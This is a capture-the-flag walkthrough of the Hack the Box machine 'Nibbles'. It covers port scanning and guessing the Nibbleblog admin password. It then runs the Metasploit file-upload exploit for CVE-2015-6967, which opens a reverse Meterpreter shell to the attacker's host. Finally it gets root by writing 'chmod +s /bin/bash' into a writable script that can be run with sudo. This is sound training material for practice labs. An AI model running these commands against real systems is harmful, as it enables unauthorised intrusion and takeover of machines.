---
source: Hack the Box
title: Nibbles
difficulty: easy
tags: File Upload, Nibble CMS, Sudo Abuse
summary: **Nibles**: A vulnerable `Nibbles CMS` instance can be exploited via authenticated file upload resulting in a remote connection to the machine. User enumeration 
shows `sudo` privileges to a writeable script that can be abused to do a number of things as the `root` user, ultimately leading to privilege escalation.
---

## [01] Port Scan and Service Discovery

```term
$ nmap -sC -sV -vv 10.129.64.195

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## [02] Enumerating HTTP and finding Nibbleblog CMS

On the main site there is a very basic page that simply states `Hello World!`. However, looking at the source code we can see it mention a directory.
```term
<b>Hello world!</b>
!!<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

The site shows it's powered by `Nibbleblog`.
```term
$ curl http://10.129.64.195/nibbleblog/

---snip---
!!<span class="blog-footer"> · Powered by Nibbleblog</span>
---snip---
```

We can also find the version by hitting the `/README` file.
```term
$ curl http://10.129.64.195/nibbleblog/README                                                                                                                                                                                                                                          
====== Nibbleblog ======
!!Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

Looking for exploits I found `CVE-2015-6967` for an arbitrary file upload (authenticated). We can attempt to guess the credentials with common username/password combos 
as well as the name of the box itself, such as `admin:admin`, `admin:password`, `admin:nibbles`. And we get a hit. Now that we have credentials, there are several exploits 
on github, but I will use the `metasploit` module as to not have to download and potentially debug scripts.

## [03] Shell as "nibbler"

We can configure the metasploit module and run it as such -
```term
!!msf exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
!!msf exploit(multi/http/nibbleblog_file_upload) > set PASSWORD xxxxxxxx
PASSWORD => xxxxxxxx 
!!msf exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.129.64.195
RHOSTS => 10.129.64.195
!!msf exploit(multi/http/nibbleblog_file_upload) > set LHOST tun0
LHOST => 10.10.15.236
!!msf exploit(multi/http/nibbleblog_file_upload) > set TARGETURI "/nibbleblog/"
TARGETURI => /nibbleblog/
!!msf exploit(multi/http/nibbleblog_file_upload) > exploit
[*] Started reverse TCP handler on 10.10.15.236:4444 
[*] Sending stage (45739 bytes) to 10.129.64.195
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.15.236:4444 -> 10.129.64.195:51514) at 2026-08-16 20:58:41 -0500

!!meterpreter > 
```

After dropping into a shell, checking `sudo` privileges reveals something interesting.
```term
$ nibbler@Nibbles:/home/nibbler$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
!!    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

## [04] Abusing Sudo Privileges

Trying to see what that script contains shows there is no such file, but we also find a `personal.zip` that contains the loot.
```term
$ nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh
!!cat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory
```
```term
$ nibbler@Nibbles:/home/nibbler$ ls -l
total 8
!!-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Aug 16 14:48 user.txt
```
```term
$ nibbler@Nibbles:/home/nibbler$ unzip personal.zip 
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
!!  inflating: personal/stuff/monitor.sh  
```

Now we list the privileges.
```term
$ nibbler@Nibbles:/home/nibbler$ ls -l personal/stuff/monitor.sh
!!-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 personal/stuff/monitor.sh
```

We have write permissions on a script we can run as `sudo`, game over.
```term
$ nibbler@Nibbles:/home/nibbler$ echo -e '#!/bin/bash\n\nchmod +s /bin/bash' > personal/stuff/monitor.sh; sudo /home/nibbler/personal/stuff/monitor.sh; bash -p
!!bash-4.3# whoami
!!root
```
